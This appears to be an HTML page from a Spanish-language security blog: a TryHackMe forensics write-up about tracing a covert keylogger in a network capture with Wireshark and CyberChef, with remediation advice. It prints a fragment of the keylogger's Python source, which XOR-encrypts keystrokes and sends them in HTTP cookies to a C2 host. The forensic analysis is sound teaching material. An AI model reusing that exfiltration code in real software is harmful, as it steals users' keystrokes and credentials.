@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 4 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Forensics / Network Analysis</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">High</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-03</div>
+      </div>
+    </div>
+
+    <h1>Covert C2 Keylogger — Exfiltración de keystokes vía cookies HTTP</h1>
+    <p class="dek">Se identificó un canal encubierto de exfiltración de datos en una captura de tráfico de red del resort. Un script malicioso (<code>updates.py</code>) operaba como keylogger, cifrando las pulsaciones de teclado con XOR y codificándolas en Base64 para enviarlas a un servidor C2 ocultas dentro de cookies HTTP.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El punto de partida fue un archivo de captura de red (<code>traffic.pcapng</code>) proporcionado por VERA. Según el briefing, alguien estaba exfiltrando datos del resort disfrazándolos como tráfico ordinario — paquetes pequeños, a intervalos regulares, en horarios nocturnos.</p>
+    <p>Al abrir la captura en Wireshark se observaron 1348 paquetes. El tráfico inicial consistía en conexiones TCP sobre loopback (127.0.0.1) y solicitudes ARP entre dispositivos de la red local. A primera vista, nada evidentemente malicioso.</p>
+    <pre><code># Apertura del pcap y análisis inicial
+Wireshark → traffic.pcapng
+Total: 1348 paquetes
+Protocolos observados: TCP, ARP, HTTP</code></pre>
+    <p>Al aplicar el filtro <code>http</code> el panorama cambió: se reveló una serie de solicitudes HTTP GET entre dos hosts (<code>192.168.1.141</code> y <code>34.41.103.191</code>) con un patrón repetitivo y rítmico, exactamente el tipo de tráfico que el briefing describía.</p>
+
+    <figure>
+      <img src="../assets/img/Day4-http-filter.png" alt="Wireshark con filtro HTTP mostrando tráfico repetitivo entre dos hosts">
+      <figcaption>Fig. 1 — Filtro HTTP aplicado: se observa tráfico periódico GET entre la máquina interna y un host externo.</figcaption>
+    </figure>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>La primera solicitud HTTP destacada era un <code>GET /temp/updates.py</code> hacia el host <code>byte-lotus-hotel.thm:8080</code>. El servidor respondió con un script Python completo de tipo <code>text/x-python</code>. Al seguir el TCP stream (stream 5) se reveló el contenido íntegro del script: un keylogger que capturaba cada pulsación de teclado y la exfiltraba al servidor C2.</p>
+    <p>El mecanismo era el siguiente:</p>
+    <ul>
+      <li>El script utilizaba <code>pynput</code> para capturar teclas en tiempo real.</li>
+      <li>Cada carácter era cifrado con XOR usando una clave compuesta por dos fragmentos hardcodeados: <code>p1 = "H0t3lSt@ff0Nly"</code> y <code>p2 = "K3epS3cr3t!"</code>.</li>
+      <li>El resultado cifrado se codificaba en Base64 y se enviaba como valor de la cookie <code>hotel_sess_state</code> en solicitudes GET al C2.</li>
+      <li>El User-Agent se spoofeaba como <code>ByteLotusClient/1.1</code> para mimetizarse con tráfico legítimo del hotel.</li>
+    </ul>
+
+    <div class="callout"><strong>Nota:</strong> El script se disfrazaba como un servicio legítimo del hotel, imprimiendo el mensaje <code>[*] Byte Lotus Sync Service started...</code> al ejecutarse. La clave XOR dividida en dos variables (<code>p1</code> + <code>p2</code>) es una técnica básica de ofuscación para evitar detección por strings estáticos.</div>
+
+    <figure>
+      <img src="../assets/img/Day4-tcp-stream.png" alt="TCP stream mostrando el script updates.py con el keylogger">
+      <figcaption>Fig. 2 — TCP stream del script malicioso: se observa la descarga de updates.py con las funciones de keylogging, cifrado XOR y exfiltración vía cookie.</figcaption>
+    </figure>
+
+    <h2>Explotación (PoC)</h2>
+    <p><strong>Paso 1 — Identificación del script malicioso.</strong> Se filtró el tráfico HTTP y se localizó la solicitud inicial <code>GET /temp/updates.py</code>. Siguiendo el TCP stream se extrajo el código fuente completo del keylogger.</p>
+    <pre><code># Fragmento clave del script updates.py
+C2_URL = "http://byte-lotus-hotel.thm:8080/"
+
+def getkey():
+    p1 = "H0t3lSt@ff0Nly"
+    p2 = "K3epS3cr3t!"
+    return p1 + p2
+
+def xor(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+def sendltr(character):
+    raw_bytes = character.encode('utf-8')
+    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
+    b64_string = base64.b64encode(encrypted).decode('utf-8')
+    headers = {
+        "User-Agent": "Mozilla/5.0 ... ByteLotusClient/1.1",
+        "Cookie": f"hotel_sess_state={b64_string}"
+    }
+    requests.get(C2_URL, headers=headers, timeout=0.5)</code></pre>
+
+    <p><strong>Paso 2 — Filtrado de paquetes con datos exfiltrados.</strong> Conociendo que los datos viajaban en la cookie <code>hotel_sess_state</code>, se aplicó el filtro de Wireshark:</p>
+    <pre><code>http.cookie contains "hotel_sess_state"</code></pre>
+    <p>Esto aisló todos los paquetes que contenían keystokes cifrados, revelando decenas de solicitudes GET periódicas hacia el C2.</p>
+
+    <figure>
+      <img src="../assets/img/Day4-cookie-filter.png" alt="Wireshark filtrado por cookie hotel_sess_state">
+      <figcaption>Fig. 3 — Paquetes filtrados por la cookie hotel_sess_state: cada GET transporta un carácter cifrado.</figcaption>
+    </figure>
+
+    <p><strong>Paso 3 — Extracción y decodificación.</strong> Se extrajeron los valores Base64 de las cookies y se concatenaron. Luego se utilizó CyberChef para revertir el proceso: <code>From Base64 → XOR</code> con la clave <code>H0t3lSt@ff0NlyK3epS3cr3t!</code>.</p>
+    <pre><code># Receta CyberChef
+From Base64 → XOR (Key: H0t3lSt@ff0NlyK3epS3cr3t!, Scheme: Standard)</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day4-cyberchef-flag.png" alt="CyberChef decodificando la flag desde los datos exfiltrados">
+      <figcaption>Fig. 4 — CyberChef revierte el cifrado y revela la flag en texto plano.</figcaption>
+    </figure>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La decodificación reveló el contenido completo de las pulsaciones de teclado capturadas, incluyendo la flag del reto. El impacto de este tipo de ataque en un entorno real sería severo:</p>
+    <ul>
+      <li><strong>Captura de credenciales:</strong> cualquier contraseña, usuario o token ingresado por teclado queda registrado y exfiltrado.</li>
+      <li><strong>Evasión de detección:</strong> el tráfico se camufla como cookies HTTP legítimas del hotel, con User-Agent falso y volumen bajo (un carácter por request), dificultando la detección por IDS/IPS convencionales.</li>
+      <li><strong>Persistencia:</strong> el script se ejecuta como un servicio en loop continuo, capturando indefinidamente mientras la máquina esté activa.</li>
+    </ul>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Monitoreo de tráfico saliente:</strong> implementar reglas que detecten patrones de beaconing — solicitudes periódicas de tamaño fijo hacia un mismo host externo, especialmente en horarios no laborales.</li>
+      <li><strong>Inspección de cookies:</strong> las cookies HTTP con valores Base64 de longitud fija y sin contexto de sesión válido deben levantar alertas en un WAF o proxy de egreso.</li>
+      <li><strong>Whitelisting de procesos:</strong> restringir la ejecución de scripts Python y el uso de bibliotecas como <code>pynput</code> en estaciones de trabajo del hotel.</li>
+      <li><strong>Segmentación de red:</strong> los equipos del personal no deberían poder alcanzar hosts externos arbitrarios por HTTP sin pasar por un proxy con inspección TLS.</li>
+      <li><strong>Análisis de User-Agent:</strong> detectar y alertar sobre User-Agents personalizados o inconsistentes con el software instalado en las máquinas del entorno.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto demuestra que la exfiltración de datos no necesita canales sofisticados — una simple cookie HTTP basta para sacar información byte a byte sin levantar sospechas a primera vista. La clave está en reconocer los patrones: tráfico periódico, tamaño uniforme, destino constante.</p>
+    <p>Desde el lado forense, seguir la cadena completa (captura → script → mecanismo → datos → decodificación) es fundamental. No alcanza con encontrar el script: hay que entender el cifrado, extraer los datos del canal encubierto y revertir el proceso para demostrar el impacto. Las herramientas como Wireshark (filtros, TCP streams) y CyberChef (cadenas de decodificación) son esenciales en este tipo de análisis.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
